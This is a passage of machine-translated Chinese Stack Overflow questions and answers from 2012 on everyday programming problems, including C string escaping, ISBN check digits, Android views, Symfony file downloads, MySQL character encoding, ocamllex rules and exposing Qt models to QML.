提前感谢任何提示、提示或技巧。

/布莱恩

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T05:08:34.483

虽然很伤心，但我修改了 Dreamweaver 中内置的图像交换功能来解决这个问题。

Dreamweaver 有一个交换图像的代码，`mouseOver`用于交换和`mouseOut`恢复原始图像（我相信大多数人都知道这一点）。

而不是这些，我只是使用该`onBlur`功能来交换图像，省略任何恢复交换，然后我使用它，以便预览图像与在某个字段中输入的图像源交换。

```
<p>
<img name='flipflop{$feed->individualTag}' src='{$feed->smallImage}' />
</p> 
```

这上面的代码相同。

对于字段条目：

```
onblur="MM_swapImage('flipflop{$feed->individualTag}','',(this.value),1);" /> 
```

当然，我复制了 MM-swapImage 脚本并将其放入文件中......显然。

不迷人，不聪明，没有创造力，没有才华......但功能齐全。

对于一个像我一样了解 js、jquery 和 php 的人来说......功能为王。

# c++ - system() 调用...打开 mybatchfiles.bat

> ID：11806290
> 
> 赞同：-3
> 
> 时间：2012-08-04T05:47:37.757
> 
> 标签：c++, c, batch-file

`system()`使用调用运行批处理文件时出现以下错误：

> 'C:\newfldr\mybatchfiles.bat' 不是内部或外部命令、可运行程序或批处理文件。

错误：system("C:\newfldr\mybatchfiles.bat");

谁能解释为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T05:52:42.500

您很可能应该正确编写字符串，例如：

```
 system("C:\\newfldr\\mybatchfile.bat"); 
```

请记住，C 编译器正在解释常量字符串文字中的反斜杠转义。特别`\n`是换行符，并`\\`编码反斜杠。

您可以打印命令字符串以进行调试以查找问题（或使用调试器）。

^(顺便说一句，在 Linux 上你没有这个问题，因为`\`很少在文件路径中使用。你考虑过尝试 Linux 吗？（很好玩）。)

# .net - 带有 EF 的 MVC3，更新记录时出错“更新条目时发生错误。有关详细信息，请参阅内部异常。”

> ID：11806297
> 
> 赞同：-2
> 
> 时间：2012-08-04T05:49:08.023
> 
> 标签：.net, asp.net-mvc, asp.net-mvc-3, entity-framework-4

在首先使用 MVC3 使用 EF DB 时，我遇到了主题问题。

请注意，我的 EF 模型位于 MVC 项目中引用的类库中。

在添加新控制器时，我选择了“使用实体框架的具有读写操作和视图的控制器”。作为模型类，我选择了 EF 的生成类，作为上下文，我选择了 EF 上下文。

在页面上运行它会显示记录，在单击 eidt 时它也会呈现编辑视图。只是问题是当我尝试通过错误更新它时。

请指导我。

谢谢

**EDID** 此错误并非总是如此，有时会出现此错误，有时会更新。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T20:11:21.087

我检查了内部异常，然后看到分析器我意识到我输入的数据大于列大小。我纠正了它，之后就没事了。

# iphone - 如何在 iOS 中获取 ISBN 条码

> ID：11806298
> 
> 赞同：5
> 
> 时间：2012-08-04T05:49:10.687
> 
> 标签：iphone, ios, xcode, barcode, barcode-scanner

我正在做一个关于 ISBN 条码扫描的项目。我尝试了许多扫描应用程序，但在扫描此条码后：![在此处输入图像描述](../Images/dc2a95596f83d9f8047518083cb973fa.png)

该应用程序只给了我条形码 9780749423490。但我需要获得的是 ISBN 代码 0749423498，因为它在我图书馆的数据库中。有什么方法可以得到吗？

谁能解释这两个代码之间的区别？为什么条码号和 ISBN 条码号不同？有些书是一样的，有些书是不同的吗？谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-04T06:34:32.957

看起来混淆是“ISBN 10”和“ISBN 13”标准之间的区别。

ISBN 机构网站[常见问题解答](http://www.isbn.org/standards/home/about/faqs_main.html)说：

```
"Does the ISBN-13 have any meaning imbedded in the numbers? 
The five parts of an ISBN are as follows:

 1\. The current ISBN-13 will be prefixed by "978"
 2\. Group or country identifier which identifies a national or geographic grouping of publishers
 3\. Publisher identifier which identifies a particular publisher within a group
 4\. Title identifier which identifies a particular title or edition of a title
 5\. Check digit is the single digit at the end of the ISBN which validates the ISBN" 
```

所以978显然只是填充物。在那之后，接下来的9个数字在两个数字中显然是相同的。两个数字中的最后一个数字是校验位，在 ISBN 10 和 ISBN 13 中是不同的。有关详细信息，请参阅[此 Wikipedia 文章](http://en.wikipedia.org/wiki/Check_digit#ISBN_10)，但两个公式是：

对于 ISBN 10（前一位），所有数字的总和乘以 10-9-8-7-6-5-4-3-2-1 mod 11 应为 0：

```
0*10 + 7 *9 + 4*8 + 9*7 + 4*6 + 2*5 + 3*4 + 4*3 + 9*2 + 8*1 % 11 == 0 
```

对于 ISBN 13（底部），奇数位之和 * 1 加上偶数位之和 * 3 应为 0。这包括前导 978。（这类似于 UPC 代码为“用户... ” 提到但与维基百科文章中提到的略有不同）：

```
9*1 + 7*3 + 8*1 + 0*3 + 7*1 + 4*3 + 9*1 + 4*3 + 2*1 + 3*3 + 4*1 + 9*3 + 0*1 % 10 == 0 
```

因此，您可以从 ISBN 13（底部）代码中获取 ISBN 10 代码（顶部），如下所示：

```
isbnBaseCode = <9780749423490 from the 4th to 12th characters>

isbn10CheckDigit = 11 - (isbnBaseCode[0]*10 + isbnBaseCode[1]*9 + ... + isbnBaseCode[8]*2) % 11

isbnCode10 = isbnBaseCode + isbn10CheckDigit 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:47:32.503

您的问题的长短是它们实际上都是 ISBN。一种是 10 位格式，另一种是较新的 13 位格式。

```
978 074942349 0
    074942349 8 
```

978 是前缀，最后一个数字都是校验位。您正在扫描的商品上的条形码仅代表 13 位格式。

根据[http://www.isbn.org/standards/home/isbn/transition.asp](http://www.isbn.org/standards/home/isbn/transition.asp) 您始终可以从以 978 开头的 13 位 ISBN 转换为 10 位格式，并提供在线转换器的链接。它还讨论了 979 前缀。我不相信 979 前缀正在被使用，但很高兴知道它们将来可能会被使用。

在图书馆应用程序空间中工作后，在搜索图书馆目录项目时，记录所包含的信息会有很大差异。单册记录，特别是关于 ISBN 的记录，可以包含 10 位 ISBN、13 位 ISBN，两者都包含，或者都不包含。因此，要找到一个项目，您可能必须尝试两种格式。我相信有些系统，如果你的搜索类型设置为 ISBN，实际上会检查提交的 ISBN 并自动搜索这两种格式。

取决于你想做什么。许多图书馆搜索功能允许使用通配符，这样可以更轻松地找到您要查找的项目。例如：

```
'if the isbn has a length of 13 and starts with 978 
    remove the first 3 (the 978) and last digit (the check digit)
    add a wildcard character to the front and back
    begin search
end if 
```

例如 9780749423490 会变成 *07494234* 缺点是它可能会返回多个结果。即使发生这种情况，它也可能只有几件物品，而您正在寻找的物品（如果有的话）很容易被发现。

正如其他人所提供的，关于 ISBN 的 Wikipedia 文章详细介绍了如何在 10 位和 13 位数字格式之间进行转换。 [http://en.wikipedia.org/wiki/International_Standard_Book_Number](http://en.wikipedia.org/wiki/International_Standard_Book_Number)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T06:10:40.407

以 978 开头的数字是产品代码，特别是 UPC（通用产品代码），其中包括 ISBN，但末尾没有校验位。查看[维基百科上的 ISBN 以](http://en.wikipedia.org/wiki/ISBN)获取生成校验位的代码，您将能够从 UPC 重建 ISBN。

# android - 在 Android 的 SOAP 请求中发送和接收 XML

> ID：11806304
> 
> 赞同：1
> 
> 时间：2012-08-04T05:50:57.737
> 
> 标签：android, xml-serialization, ksoap2

我想转换我的 XML 并将其发送到 Web 服务，该 Web 服务正在以字符串的形式接收 XML 文件作为参数，但是我收到 Web 服务对象引用的错误，该引用未发送到对象实例，任何以前使用过发送 XML 的人Web 服务并接收 XML 作为响应。

这是我正在使用的代码：

```
 private static String Soap_Action = "http://portal.ordernet.net/RequestorderStringg";
    private static String namespace = "http://portal.ordernet.net";
    private static String methodName = "RequestorderString";
    private static String URL = "https://portal.ordernet.net/WebServiceorderNotice.asmx";

    DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory
                    .newInstance();
    DocumentBuilder documentBuilder = documentBuilderFactory
                    .newDocumentBuilder();
    Document document = documentBuilder.newDocument();

    Element rootElement = document.createElement("dmi:ShipNoticeRequest");
    rootElement.setAttribute("xmlns:dmi",  "http://portal.suppliesnet.net");

    document.appendChild(rootElement);

    Element ContactElement =  document.createElement("dmi:RequesterISA");         
    rootElement.appendChild(ContactElement);
    ContactElement.appendChild(document.createTextNode("123456789012345"));

    Element articleElement = document.createElement("dmi:ShipDateRange");

    Element ShipDateFrom = document.createElement("dmi:ShipDateFrom");
    articleElement.appendChild(ShipDateFrom);
    ShipDateFrom.appendChild(document.createTextNode("2012-06-14"));

    Element ShipDateTo  = document.createElement("dmi:ShipDateTo");
    articleElement.appendChild(ShipDateTo);
    ShipDateTo.appendChild(document.createTextNode("2012-06-15"));

    rootElement.appendChild(articleElement);
    TransformerFactory factory = TransformerFactory.newInstance();
    Transformer transformer = factory.newTransformer();
    Properties outFormat = new Properties();
    outFormat.setProperty(OutputKeys.INDENT, "yes");
    outFormat.setProperty(OutputKeys.METHOD, "xml");
    outFormat.setProperty(OutputKeys.OMIT_XML_DECLARATION, "no");
    outFormat.setProperty(OutputKeys.VERSION, "1.0");
    outFormat.setProperty(OutputKeys.ENCODING, "UTF-8");
    transformer.setOutputProperties(outFormat);
    DOMSource domSource = new DOMSource(document.getDocumentElement());
    OutputStream output = new ByteArrayOutputStream();
    StreamResult result = new StreamResult(output);
    transformer.transform(domSource, result);
    xmlString = output.toString();

        } catch (ParserConfigurationException e) {
        } catch (TransformerConfigurationException e) {
        } catch (TransformerException e) {
        }
     SoapObject request = new SoapObject(namespace, methodName);
    request.addProperty("RequestShipmentNoticeString", xmlString);

    SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(
                SoapEnvelope.VER11);

    envelope.dotNet = true;
    envelope.setOutputSoapObject(request);
        // envelope.headerIn.
    final HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);

    androidHttpTransport.debug = true;
    try {
    androidHttpTransport.call(Soap_Action, envelope);
    SoapObject SoapResult = (SoapObject)envelope.bodyIn;
    tv.setText("Status" + SoapResult);
    } catch (Exception ex) {
    ex.printStackTrace();
    Log.e("static", "Exception in making call to server");
    } 
```

# lua - 为什么使用`not not`操作？

> ID：11806305
> 
> 赞同：1
> 
> 时间：2012-08-04T05:51:07.110
> 
> 标签：lua

在以下 Lua 代码中：

```
function eq_event(op1, op2)
    if op1 == op2 then
        return true
    end
    local h = getequalhandler(op1, op2)
    if h then
        return not not h(op1, op2)
    else
        return false
    end
end 
```

为什么要`not not`在返回值之前使用？它与原始返回值不同吗？我还记得在 C 中，也有机会使用`!!`before 一些表达式，它们是否相同？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T05:55:52.427

`not not`会将 nil 转换为 false，以及除`false`to之外的所有其他值`true`。只有在与 C 交互时，您可能需要返回一个布尔值。

是的，它与 C 中的相同`!!`。唯一的区别是在 C 中，0（以及我不记得的一些其他值）也是虚假的（也就是说，当加倍 not'd 时它们将返回 false）。

# android - 如何在 android 的扩展视图类上应用 Click 事件？

> ID：11806307
> 
> 赞同：0
> 
> 时间：2012-08-04T05:51:46.957
> 
> 标签：android, view, canvas, ontouchlistener

嗨，我想创建简单的应用程序。我使用一个名为 Drawcanvas 的自定义类，用于绘制运行时画布。所以我使用 ontouchListener 和 OnClicklistener onthis。但这些事件无法正常工作。我的代码如下。 **这是我使用自定义类名的类，如 DrawCanvas**

```
public class CanvasExample extends Activity 
{
    /** Called when the activity is first created. */

    RelativeLayout relMainOperationLayout;
    RelativeLayout relTabHeader;
    RelativeLayout relMidalLayout;
    RelativeLayout relBelowLayout;
    Context myContext;
    DrawCanvas drawCanvas;

    @Override
    public void onCreate(Bundle savedInstanceState) 
    {
        super.onCreate(savedInstanceState);
        myContext=CanvasExample.this;

        LayoutInflater layoutInflater=(LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);   

        int layoutId = myContext.getResources().getIdentifier("main","layout",getPackageName());

        relMainOperationLayout = (RelativeLayout) layoutInflater.inflate(layoutId,null);

        relTabHeader=(RelativeLayout) relMainOperationLayout.findViewById(R.id.relHeadLayout);

        relMidalLayout=(RelativeLayout) relMainOperationLayout.findViewById(R.id.relmidalLayout);

        relBelowLayout=(RelativeLayout) relMainOperationLayout.findViewById(R.id.relBelowLayout);

        drawCanvas=new DrawCanvas(CanvasExample.this,myContext);
        drawCanvas.setBackgroundColor(Color.YELLOW);
        RelativeLayout.LayoutParams drawParams=new RelativeLayout.LayoutParams(LayoutParams.FILL_PARENT,400);
        drawParams.addRule(RelativeLayout.BELOW, relTabHeader.getId());
        //relMidalLayout.addView(drawCanvas,drawParams);
        relMainOperationLayout.addView(drawCanvas,drawParams);
        setContentView(relMainOperationLayout);
    } 
```

**这是我扩展 View 的 CustomClass 代码。名称 DrawCanvas**

```
public class DrawCanvas extends View  implements  View.OnTouchListener,View.OnClickListener
{

    Context drawContext;
    Activity drawActivity;
    public DrawCanvas(Activity activity,Context context)
    {
        super(activity);
        this.drawActivity=activity;
        this.drawContext=context;
    }
    @Override
    public void onClick(View v) 
    {
        System.err.println("Click Here");
        Toast.makeText(drawContext, "Click ", 1000).show();

    }
    @Override
    public boolean onTouch(View v, MotionEvent event) 
    {
        System.err.println("Touch Here");
        return true;
    }

} 
```

我是帆布新手。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T06:00:07.517

您必须使用`setOnTouchListener`and `setOnClickListener`（尽管我认为点击事件不会帮助您）为您的`View`.

```
public DrawCanvas(Activity activity,Context context) {
    super(activity);
    this.drawActivity=activity;
    this.drawContext=context;
    setOnTouchListener(this);
    setOnClickListener(this);
} 
```

# php - 尝试使用 Symfony2 下载和保存 PDF 文件

> ID：11806309
> 
> 赞同：1
> 
> 时间：2012-08-04T05:52:13.990
> 
> 标签：php, curl, file-io, symfony

我正在尝试从在线资源下载并保存 PDF 文件。我已经看过关于文件上传的食谱章节，并尝试修改该技术以供我自己使用。我只是无法让它工作。

控制器代码：

```
namespace Acme\DemoBundle\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;

use Acme\DemoBundle\Entity\Shipment;

class WelcomeController extends Controller
{
    public function indexAction(Request $request)
    {
        echo $barcodeUrl  = "http://www.website.com/somefile.pdf";

        $Shipment = new Shipment();
        $Shipment->setBarcodeUrl($barcodeUrl);

        $em = $this->getDoctrine()->getEntityManager();
        $em->persist($Shipment);
        $em->flush(); 

        // Saving The File:
        $saveto = __DIR__.'/../../../../web/uploads/documents';
        $ch = curl_init($barcodeUrl);
        $fp = fopen($saveto,'wb');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_exec($ch);
        curl_close($ch);
        fclose($fp); 

        return new Response('Created shipment and saved file");
    }

    protected function getUploadRootDir()
    {
        return __DIR__.'/../../../../web'.$this->getUploadDir();
    }

    protected function getUploadDir()
    {
        return 'uploads/documents';
    }
} 
```

每次我运行上面的代码。它将一个文件保存在 web 文件夹中，该文件具有我提到的路径作为它的名称。该文件无法打开，甚至没有以任何扩展名保存。

保存的文件：`/../../../../web/home/webmuch/uploads`在 web 文件夹中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:26:03.587

不是真正的 Symfony2 问题。您还需要将文件名传递给 fopen。所以应该是这样的：

```
$fp = fopen(sprintf('%s/%s.%s', $saveto, sha1($barcodeUrl), 'pdf'),'wb'); 
```

另外我注意到你有`getUploadRootDir()`你没有使用的方法，我假设因为它对你不起作用 - 原因是你在那里缺少一个斜杠

```
protected function getUploadRootDir()
{
    return __DIR__.'/../../../../web/'.$this->getUploadDir();
} 
```

最后但并非最不重要的一点是，您可以通过以下方式获取网络位置`$this->container->getParameter('kernel.root_dir').'/../web'`

所以

```
protected function getUploadRootDir()
{
    return $this->container->getParameter('kernel.root_dir').'/../web/'.$this->getUploadDir();
} 
```

# database - 如何恢复oracle备份文件

> ID：11806314
> 
> 赞同：1
> 
> 时间：2012-08-04T05:53:54.807
> 
> 标签：database, oracle

我从我的一个朋友那里得到了一个备份文件（Oracle 10g）文件。创建备份时，这些是消息：-

```
Warning: Log archiving (ARCHIVELOG mode) is currently disabled. If
you restore the database from this backup, any transactions that take
place between this backup and the next backup will be lost. It is
recommended that you enable ARCHIVELOG mode before proceeding so
that all transactions can be recovered upon restore. See the section
'Enabling ARCHIVELOG Mode...' in the online help for instructions.
Backup with log archiving disabled will shut down and restart the
database. Are you sure [Y/N]? y
Backup in progress...

Recovery Manager: Release 10.2.0.1.0 - Production on Thu Jul 26 17:54:02 2012

Copyright (c) 1982, 2005, Oracle.  All rights reserved.

connected to target database: XE (DBID=2585947637)

RMAN> set echo on;
2> shutdown immediate;
3> startup mount;
4> configure controlfile autobackup format for device type disk clear;
5> configure retention policy to redundancy 2;
6> configure controlfile autobackup on;
7> sql "create pfile=''C:\ORACLEXE\APP\ORACLE\PRODUCT\10.2.0\SERVER\DATABASE\SPF
ILE2INIT.ORA'' from spfile";
8> backup as backupset device type disk database;
9> configure controlfile autobackup off;
10> alter database open;
11> delete noprompt obsolete;
12>
echo set on

using target database control file instead of recovery catalog
database closed
database dismounted
Oracle instance shut down

connected to target database (not started)
Oracle instance started
database mounted

Total System Global Area     251658240 bytes

Fixed Size                     1286820 bytes
Variable Size                 92278108 bytes
Database Buffers             155189248 bytes
Redo Buffers                   2904064 bytes

RMAN configuration parameters are successfully reset to default value

old RMAN configuration parameters:
CONFIGURE RETENTION POLICY TO REDUNDANCY 2;
new RMAN configuration parameters:
CONFIGURE RETENTION POLICY TO REDUNDANCY 2;
new RMAN configuration parameters are successfully stored

old RMAN configuration parameters:
CONFIGURE CONTROLFILE AUTOBACKUP OFF;
new RMAN configuration parameters:
CONFIGURE CONTROLFILE AUTOBACKUP ON;
new RMAN configuration parameters are successfully stored

sql statement: create pfile=''C:\ORACLEXE\APP\ORACLE\PRODUCT\10.2.0\SERVER\DATAB
ASE\SPFILE2INIT.ORA'' from spfile

Starting backup at 26-JUL-12
allocated channel: ORA_DISK_1
channel ORA_DISK_1: sid=35 devtype=DISK
channel ORA_DISK_1: starting full datafile backupset
channel ORA_DISK_1: specifying datafile(s) in backupset
input datafile fno=00001 name=C:\ORACLEXE\ORADATA\XE\SYSTEM.DBF
input datafile fno=00003 name=C:\ORACLEXE\ORADATA\XE\SYSAUX.DBF
input datafile fno=00002 name=C:\ORACLEXE\ORADATA\XE\UNDO.DBF
input datafile fno=00004 name=C:\ORACLEXE\ORADATA\XE\USERS.DBF
channel ORA_DISK_1: starting piece 1 at 26-JUL-12
channel ORA_DISK_1: finished piece 1 at 26-JUL-12
piece handle=C:\ORACLEXE\APP\ORACLE\FLASH_RECOVERY_AREA\XE\BACKUPSET\2012_07_26\
O1_MF_NNNDF_TAG20120726T175506_812M1W98_.BKP tag=TAG20120726T175506 comment=NONE

channel ORA_DISK_1: backup set complete, elapsed time: 00:00:47
Finished backup at 26-JUL-12

Starting Control File and SPFILE Autobackup at 26-JUL-12
piece handle=C:\ORACLEXE\APP\ORACLE\FLASH_RECOVERY_AREA\XE\AUTOBACKUP\2012_07_26
\O1_MF_S_789674071_812M3BF5_.BKP comment=NONE
Finished Control File and SPFILE Autobackup at 26-JUL-12

old RMAN configuration parameters:
CONFIGURE CONTROLFILE AUTOBACKUP ON;
new RMAN configuration parameters:
CONFIGURE CONTROLFILE AUTOBACKUP OFF;
new RMAN configuration parameters are successfully stored

database opened

RMAN retention policy will be applied to the command
RMAN retention policy is set to redundancy 2
using channel ORA_DISK_1
Deleting the following obsolete backups and copies:
Type                 Key    Completion Time    Filename/Handle
-------------------- ------ ------------------ --------------------
Backup Set           1      05-FEB-11
  Backup Piece       1      05-FEB-11          C:\ORACLEXE\APP\ORACLE\FLASH_RECO
VERY_AREA\XE\BACKUPSET\2011_02_05\O1_MF_NNNDF_TAG20110205T133646_6NT6KHN0_.BKP
Backup Set           2      05-FEB-11
  Backup Piece       2      05-FEB-11          C:\ORACLEXE\APP\ORACLE\FLASH_RECO
VERY_AREA\XE\AUTOBACKUP\2011_02_05\O1_MF_S_742311382_6NT6LXNJ_.BKP
deleted backup piece
backup piece handle=C:\ORACLEXE\APP\ORACLE\FLASH_RECOVERY_AREA\XE\BACKUPSET\2011
_02_05\O1_MF_NNNDF_TAG20110205T133646_6NT6KHN0_.BKP recid=1 stamp=742311407
deleted backup piece
backup piece handle=C:\ORACLEXE\APP\ORACLE\FLASH_RECOVERY_AREA\XE\AUTOBACKUP\201
1_02_05\O1_MF_S_742311382_6NT6LXNJ_.BKP recid=2 stamp=742311453
Deleted 2 objects 
```

在我的本地系统中，oracle 10g 有一个用户“Manoj”。请帮助我如何将该备份恢复到我的本地磁盘中。提前致谢。

# php - PHP MySQL 希腊字母显示为 ???? 分数

> ID：11806319
> 
> 赞同：12
> 
> 时间：2012-08-04T05:54:42.880
> 
> 标签：php, mysql, character-encoding

我有一个带有一些文本的表格，并且文本是希腊字母，当我使用 sql 工具并从该表格中选择数据时正确显示 ![SQL 查询结果的图像](../Images/1c8235f8083cbbe4dc3a9418b2ec1c67.png)

但是当我使用 mysql_fetch 数组显示我的网站前端时，当 echo 显示如下 ![在此处输入图像描述](../Images/1e47e6c3ce56f45e45a5174fe976cef2.png)

任何人都知道如何解决此错误，谢谢。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-04T06:32:49.310

尝试以下操作：

连接到 mysql 后，执行以下查询以确保您使用的是 UTF8：

```
mysql_query("SET NAMES 'utf8'");
mysql_query("SET CHARACTER SET 'utf8'"); 
```

确保在 HTML (head) 中使用正确的编码，尝试：

```
<meta http-equiv="content-type" content="text/html; charset=UTF-8"> 
```

如果这没有帮助，请尝试不同的编码，例如 ISO-8859-1

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-11-04T18:58:18.363

试试这个：

```
mysqli_set_charset($con, "utf8"); 
```

连接到数据库后。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-05-27T11:09:13.723

把这个留给那些通过谷歌来到这个网站的人，因为他们有同样的问题，但使用 PDO 代替（像我一样） - 你应该没问题：

```
$dns = "mysqli:host=localhost;dbname=db_name";
$pdo = new PDO($dns, 'db_user', 'db_pass',
        array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8'));
$pdo->exec("SET CHARACTER SET 'utf8'"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-08-30T12:29:40.757

我浪费了很多时间，直到我弄清楚了。

**简介：** 希腊字符在 mysql 中出现错误。我在 PHP 中应用**了 qxxx**答案并且工作正常。然后我不得不将所有内容迁移到新主机上，然后问题再次出现。

**什么问题？**

MySQL 的模式字符集设置为拉丁文。存储过程为其参数继承了 MySQL 的模式字符集。

**所以我做了什么：**

1.  删除 MySQL 过程/函数（确保备份代码）

2.  更改了 MySQL 的默认字符集（使用 MySQL Workbench，右键单击您的数据库名称 - 有一个 db 图标..）

3.  重新创建 MySQL 过程/函数

另外，我完整地保留了**qxxx**的修复程序！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-10-13T09:57:38.633

您不必删除表或任何东西。使用 MySQL Workbench 并转到每个表。将排序规则更改为 utf8 - 默认排序规则或 utf8 - 通用 ci。然后对类型为 Varchar 的每一列执行相同的操作 - 它位于窗口底部。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-03T16:25:44.280

我在实现希腊字符时遇到了同样的问题。像 mysql_`query("SET NAMES 'utf8'"); mysql_query("SET CHARACTER SET 'utf8'");`这样的解决方案对我不起作用。谷歌搜索后，我发现数据库排序规则的字符集应该`greek_general_ci`与存储数据的字段（如类别名称等）一起制作。这解决了我的问题。

# android - 在android中播放.gif图像而不使用webview

> ID：11806320
> 
> 赞同：1
> 
> 时间：2012-08-04T05:54:50.433
> 
> 标签：android

我试过这样，我在网上找到了播放 gif 图像：

```
private class MYGIFView extends View {

    Movie movie;
    InputStream is = null;
    long moviestart;

    public MYGIFView(Context context) {
        super(context);

        // Provide your own gif animation file

        is = context.getResources().openRawResource(R.drawable.mygif);
        movie = Movie.decodeStream(is);

    }

    @Override
    protected void onDraw(Canvas canvas) {

        canvas.drawColor(Color.WHITE);
        super.onDraw(canvas);
        long now = android.os.SystemClock.uptimeMillis();
        System.out.println("now=" + now);
        if (moviestart == 0) { // first time
            moviestart = now;

        }
        System.out.println("\tmoviestart=" + moviestart);
        int relTime = (int) ((now - moviestart) % movie.duration());
        System.out.println("time=" + relTime + "\treltime="
                + movie.duration());
        movie.setTime(relTime);
        movie.draw(canvas, this.getWidth() / 2 - 20,
                this.getHeight() / 2 - 40);
        this.invalidate();
    } 
```

尽管许多人说他们得到了他们想要的结果。

我已将 gif 图像放入 drawable 中。我得到 movie.duration() null。

请提出我哪里错了或者有什么办法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:13:49.070

没有 .Android 就无法播放 GIF 文件`WebView`。您必须将其拆分为帧并自己为其设置动画。

我在另一个 StackOverflow 帖子中发现了 XoyoSoft 的[这款软件](http://www.xoyosoft.com/gs/)，称为 GifSplitter，它可以将 GIF 分割成帧。然后你会想用它们[`AnimationDrawable`](http://developer.android.com/reference/android/graphics/drawable/AnimationDrawable.html)来组合它们。

它看起来像这样：

```
// Your files:
res\drawable-xxxx\frame1.jpg
res\drawable-xxxx\frame2.jpg
res\drawable-xxxx\frame3.jpg
// ...
res\drawable-xxxx\frame99.jpg 
```

然后，上面的文档中有一个示例`AnimationDrawable`将显示如何显示这些图像。

最后，您必须加载和播放动画；文档中也对此进行了详细`AnimationDrawable`说明。

# compiler-construction - 需要一个空格让 line_terminator 被识别

> ID：11806323
> 
> 赞同：0
> 
> 时间：2012-08-04T05:55:27.753
> 
> 标签：compiler-construction, ocaml, lex, lexical-analysis

在我的声明中，`lexer.mll`我声明`EOS`如下：

```
let line_feed = '\n' (* %x200A *)
let carriage_return = '\r' (* %x200D *)
let line_terminator = line_feed | carriage_return | carriage_return line_feed 
(* KO: %x2028 | %x2029 *)
let LINE_END = line_terminator

let tab_character = '\x09' (* CHARACTER TABULATION *)
let eom_character = '\x19' (* END OF MEDIUM *)
let space_character = '\x20' (* SPACE *)
let underscore = '\x5F' (* LOW LINE or SPACING UNDERSCORE *)

let WSC = tab_character | eom_character | space_character 
let line_continuation = WSC* underscore WSC* line_terminator
let WS = (WSC | line_continuation)+
let EOL = WS? LINE_END
let EOS = EOL*

rule token = parse
  | WS       { token lexbuf }
  | LINE_END { newline lexbuf; token lexbuf }
  | EOS      { EOS } 
```

在我的`parser.mly`，我有这样的事情：

```
%token EOS
...
%%
nonterminal :
    statement EOS 
    statement { semantic-action } 
```

我如下编辑我`test_KO.txt`的`Emacs`，它在解析时引发错误：

```
a_statement
b_statement 
```

但是，如果我在后面添加一个`space`，`a_statement`它会通过解析：

```
a_statement(space)
b_statement 
```

我想原因是`line_terminator`无法识别，`test_KO.txt`但不在同一行；如果它们之间有一个，则可以识别。`a_statemnt``b_statement``line_terminator``space`

您认为添加[x2028](http://www.fileformat.info/info/unicode/char/2028/index.htm)和[x2029](http://www.fileformat.info/info/unicode/char/2029/index.htm)会`line_terminator`解决问题吗？由于`ocamllex`可能不支持很好的 unicode，所以测试它会很复杂......

否则，有没有其他解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-21T12:31:17.327

问题是您的 WS、LINE_END 和 EOS 规则都可以尝试匹配相同的字符串，请参阅[OCamllex 手册](http://caml.inria.fr/pub/docs/manual-ocaml/manual026.html#htoc144)以了解用于选择哪个正则表达式实际匹配的“最长匹配”规则。

当语句之间只有一个行终止符时，“LINE_END”和“EOS”规则都只匹配 1 个字符，但“LINE_END”规则出现得更早，因此被选中。没有发出 EOS 令牌，并且您的语法出现错误。

当您同时有空格和行终止符时，“WS”的规则将匹配 1 个字符，而 EOS 的规则将匹配两个字符（空格和换行符），因此选择 EOS 的规则。现在发出一个 EOS 令牌，您的语法按预期工作。

最简单的可能是从您的词法分析器和语法中删除 EOS 令牌。

# qt - 如何将 C++ 模型公开给 QML

> ID：11806324
> 
> 赞同：8
> 
> 时间：2012-08-04T05:55:35.270
> 
> 标签：qt, qml, qt-quick

我正在编写一个 QML+Qt 应用程序。我定义了一个这样的类：

```
class MainClass : public QObject
{
    Q_OBJECT

public:
    rosterItemModel m_rosterItemModel;
.
.
.
} 
```

rosterItemModel 模型是从 QAbstractListModel 派生的一个类。我使用这个函数将 MainClass 暴露给 qml 部分：

```
qmlRegisterType<MainClass>("CPPIntegrate", 1, 0, "MainClass"); 
```

现在我想将此模型（m_rosterItemModel）从 MainClass 分配给 QML 中 ListView 的模型属性。我尝试了以下方法，但都没有帮助:(

*   我尝试使用 Q_PROPERTY 将 m_rosterItemModel 声明为 PROPERTY。我不能这样做，因为它说 QAbstractListModel 不可复制。
*   我尝试使用 MainClass 中的 Q_INVOKABLE 函数在 qml 文件中获取指向 m_rosterItemModel 的指针。但这也没有帮助。

有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-04T06:43:06.380

不需要任何元类型注册。您需要做的就是调用 setContextProperty 并通过*指针*传递模型：

```
QQmlContext* context = view->rootContext(); //view is the QDeclarativeView
context->setContextProperty( "_rosterItemModel", &mainClassInstance->m_rosterItemModel ); 
```

在 QML 中使用它：

```
model: _rosterItemModel 
```

通过指针很重要，因为 QObject 不是可复制构造的，并且复制它们无论如何都会破坏它们的语义（因为它们具有“身份”）。

直接注册模型的替代方法是注册主类的实例并使用 Q_INVOKABLE。在主类中：

```
Q_INVOKABLE RosterItemModel* rosterItemModel() const; 
```

注册一个 mainClass 的实例（再次假设 mainClassInstance 是一个指针）：

```
context->setContextProperty( "_mainInstance", mainClassInstance ); 
```

在 QML 中：

```
model: _mainInstance.rosterItemModel() 
```

# java - 解决数独程序

> ID：11806325
